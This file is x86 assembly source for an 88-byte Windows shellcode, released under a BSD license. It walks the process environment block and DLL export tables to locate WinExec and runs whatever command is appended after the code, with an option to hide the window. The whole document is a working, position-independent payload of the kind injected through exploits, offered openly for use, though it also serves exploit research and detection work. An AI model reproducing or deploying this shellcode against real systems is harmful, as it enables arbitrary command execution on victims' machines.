;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;

; 88 byte WinExec shellcode for x86 windows
; odzhan

      bits   32
      
      ; SW_HIDE=0
      ; SW_SHOW=5

      pushad
      xor    eax, eax
      push   5
      ;push   eax             ; SW_HIDE
      jmp    load_cmd
init_cmd:      
      mov    eax, [fs:eax+30h]  ; eax = (PPEB) __readfsdword(0x30);
      mov    eax, [eax+0ch]  ; eax = (PPEB_LDR_DATA)peb->Ldr
      mov    edi, [eax+0ch]  ; edi = ldr->InLoadOrderModuleList.Flink
      jmp    get_dll
next_dll:    
      mov    edi, [edi]      ; edi = dte->InLoadOrderLinks.Flink
get_dll:
      mov    ebx, [edi+18h]  ; ebx = dte->DllBase
      ; eax = IMAGE_DOS_HEADER.e_lfanew
      mov    eax, [ebx+3ch]
      ; ecx = IMAGE_DATA_DIRECTORY.VirtualAddress
      mov    ecx, [ebx+eax+78h]
      jecxz  next_dll
      ; esi = offset IMAGE_EXPORT_DIRECTORY.NumberOfNames 
      lea    esi, [ebx+ecx+18h]
      lodsd
      xchg   eax, ecx
      jecxz  next_dll        ; skip if no names
      push   edi             ; save DTE
      ; save IMAGE_EXPORT_DIRECTORY.AddressOfFunctions     
      lodsd
      add    eax, ebx        ; eax = RVA2VA(eax, ebx)
      push   eax             ; save address of functions
      ; edi = IMAGE_EXPORT_DIRECTORY.AddressOfNames
      lodsd
      add    eax, ebx        ; eax = RVA2VA(eax, ebx)
      xchg   eax, edi        ; swap(eax, edi)
      ; save IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
      lodsd
      add    eax, ebx        ; eax = RVA(eax, ebx)
      push   eax             ; save address of name ordinals
get_name:
      mov    esi, [edi+4*ecx-4] ; esi = RVA of API string
      cmp    dword[esi+ebx], 'WinE'
      loopne get_name           ; --ecx && WinExec not found
      pop    edx                ; edx = AddressOfNameOrdinals
      pop    esi                ; esi = AddressOfFunctions
      pop    edi                ; restore DTE
      jne    next_dll           ; get next DLL        
      movzx  eax, word [edx+2*ecx] ; eax = AddressOfNameOrdinals[eax]
      add    ebx, [esi+4*eax] ; ecx = base + AddressOfFunctions[eax]
      call   ebx
      popad
      ret      
load_cmd:
      call   init_cmd   
      ; command goes here      
      